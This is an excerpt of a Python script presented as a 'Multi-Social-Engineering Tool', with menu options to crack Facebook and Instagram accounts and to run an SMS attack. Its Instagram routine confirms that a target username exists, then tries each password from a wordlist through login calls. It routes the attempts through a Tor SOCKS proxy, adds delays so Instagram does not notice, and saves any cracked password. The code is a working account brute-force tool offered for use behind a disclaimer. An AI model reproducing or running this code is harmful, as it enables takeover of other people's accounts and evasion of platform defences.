...
class InstagramAPI:
    ...
    def setProxy(self):
        self.socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
...
def instapy():
	...
	[+]=======================[+]
	+++++++++++++++++++++++++++++
	This program uses a python based API 
	Can crack the password to any user acc
	(with the correct password  within a psslist)
	It posts:Videos and Photos
	Please use with Caution:
	--------------------------------------------------
	Requirements: password List(psslist)
	username,email,or phone,[connected to the account]
	--------------------------------------------------
	Do you wish to continue?
	[   yes      no    ]
	"""
	yesno = raw_input("Option:").lower()
	...
	if yesno == "yes":
		...
		os.system("clear")
		print("Sorry just type in yes or no")
		b = raw_input("Pess enter to continue")
		os.system("clear")
		instapy()	
def ssms():
	clear()
...
def instagram():
	print ""+R+" "
	print "[DISCLAIMER: I AM NOT RESPONSIBLE HOW YOU USE THIS PROGRAM, OR ANY]"
	belt = raw_input("By pressing Enter you acknowledge my Disclaimer")
	os.system("clear")
	print """ 
	<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
	[+]++++++++++++++++++++++++++++++++[+]
	...
	username
	PATH to password list(ex. /root/Desktop/passwordlist.txt)
	ignore the parenthesis when you type it in.
	time delay between each password guess;
	this function allows you to try many passwords without suspicion;
	it can take a long while, but if you go to fast; instagram will detect
	your attempts and not let you try again until 10 minutes or more later.
	...
	uli = requests.get('https://www.instagram.com/%s' % username)
	if uli.status_code == 200:
		print "username exists!"
		belter = raw_input("press enter to continue:")
		os.system("clear")
		print"""
		[+]==========================[+]
		[+]Instagram-Cracker v1      [+]
		[+]==========================[+]

		"""
	else:
		print "You typed something wrong"
		print (username, "recheck your spelling or username")
		belters = raw_input("Press Enter to Continue")
		os.system("clear")
		instagram()
	print ""+G+" "
	passfl = raw_input("password file path:").strip()
	try:
		passfl = open(passfl, "rb")
	except:
		print "error, that file does not exist"
		print passfl
		bdddfd = raw_input("Press enter to continue")
		quit()

	print "(Please type in number)"
	print "(default number is 3)"
	delay = int(raw_input("time delay between each guess:") or "3")
	print "do you wish to ave the ouput to a text file?"
	outll = raw_input(":").lower()
	if outll == "yes":
		out = raw_input("PATH to output:")
		try:
			fil = open(out, "w")
		except:
			print("sorry, that text file doesn't exist")
			print("create a text file and copy the PATH into the input")
			dfdfdfd = raw_input("Press enter to continue")
			os.system("clear")
			quit()
	elif outll == "no":
		pass		
		...
		df = raw_input("Press enter to continue")
		os.system("clear")
		quit()		
	
	for password in passfl:
		api = InstagramAPI(username, password)
		if (api.login()):
			api.getSelfUserFeed()  # get self user feed
			print password
			if outll == "yes":
				fil.write('user; ' + username + ': passsword; ' + password)
				print("saved output!")
				break
			else:
				break
...
"""
	...
	try:
		...
		quit()
	timmer = raw_input("seconds between attempts:")
...
def menu():
	...
	os.system('clear')
	print """[+]==========================[+]
		 [+]Creator| Andrew El Hacker [+]
		 [+]==========================[+]
		 (To exit at any time press CTR+C)
		 --------------------------------
	 	 {Multi-Social-Engeineering Tool}
	 	 ================================
	 	 1) Facebook-Cracker
	 	 2) Sms_Attack
	 	 3) Instagram-Hacker
	 	 ...
	 	 7) option 7
	 	 """
	options = str(raw_input("Enter number option|:"))
	...
	if options == "1":
		...
		os.system('clear')
	 	print ("Oops! you typed something")
	 	c = raw_input("Pess enter to continue...")
	 	os.system("clear")
	 	menu()
